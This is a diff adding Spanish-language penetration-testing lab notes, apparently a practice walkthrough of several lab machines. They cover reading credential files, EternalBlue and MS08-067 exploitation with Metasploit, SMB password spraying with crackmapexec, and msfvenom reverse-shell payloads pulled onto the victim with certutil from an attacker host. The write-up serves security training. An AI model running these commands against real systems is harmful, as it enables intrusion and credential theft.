@@ -192,3 +192,105 @@ sqlmap -r post_request
 
 En el perfil podemos cambiar la imagen de perfil por lo que intentamos subir una Reverse Shell. Hacemos posteriormente un tratamiento de la TTY.
 
+Encontrando el usuario bella.
+
+```
+cat /etc/passwd
+```
+
+Las credenciales también se pueden encontrar en el servidor web.
+
+<pre class="language-bash"><code class="lang-bash"><strong>cat /var/www/html/traffic_offense/initialize.php
+</strong></code></pre>
+
+Encontramos unas credenciales para una base de datos. También vemos que a nivel del sistema son las mismas por lo que nos logueamos a bella.
+
+## Tercera máquina
+
+Servicios vulnerables: 135,139 y 445.
+
+```
+nmap -p445 --script="smb-vuln-*" 10.0.2.45
+```
+
+Vemos que hay un EternalBlue (ms17-010) y ms08-067.
+
+```bash
+msfconsole
+search MS17-010
+use 0
+show options
+setg RHOSTS 10.0.2.45
+run
+exploit #este módulo no sirve por no es soportable vamos a otro
+use 1
+run
+```
+
+```
+search MS08-067
+use 0
+run
+```
+
+## Cuarta máquina
+
+Servicios vulnerables: 80, 135,139 y 445.
+
+Al parecer tenemos varios usuarios. Enumeramos directorios con dirbuster pero nada. Enumeramos para el servicio SMB.
+
+```bash
+crackmapexec smb 10.0.2.46 -u '' -p '' --shares
+crackmapexec smb 10.0.2.46 -u usuarios.txt '' -p '' --shares
+crackmapexec smb 10.0.2.46 -u usuarios.txt -p usuarios.txt --shares
+```
+
+Encontramos unas credenciales bogo:bogo.
+
+```bash
+smbclient //10.0.2.46/LOGS -U bogo
+```
+
+Nos descargamos ese archivo. Vemos un comando interesante.
+
+```bash
+crackmapexec smb 10.0.2.46 -u marcos -p SuperPassword --shares
+```
+
+Accedemos al recurso WEB con el usuario Marcos.
+
+```bash
+smbclient //10.0.2.46/WEB -U marcos
+```
+
+En ese directorio encontramos los mismos archivos que hay en el servicio web por lo que podemos subir cualquier archivo en lo que hacemos una Reverse Shell.  Creamos un archivo .aspx que son los php para estos casos con MSFVenom.
+
+```bash
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.0.2.100 LPORT=443 -f aspx -o reverse.aspx
+```
+
+Lo subimos y nos ponemos en escucha.
+
+```bash
+nc -lvnp 443
+```
+
+Ya tenemos una shell de Windows. Creamos un ejecutable para que nos envíe una Reverse Shell meterpreter.
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.100 LPORT=443 -f exe -o reverse.exe
+```
+
+Levantamos un servidor http con Python.
+
+```bash
+python3 - http.server 80
+```
+
+> Nota: cambiamos el nombre de del index.html porque revisa ese archivo para el Directory listing.
+
+Nos movemos a Public/Downloads para obtener el archivo.
+
+```bash
+certutil.exe -f urlcache http://10.0.2.100/reverse.exe
+```
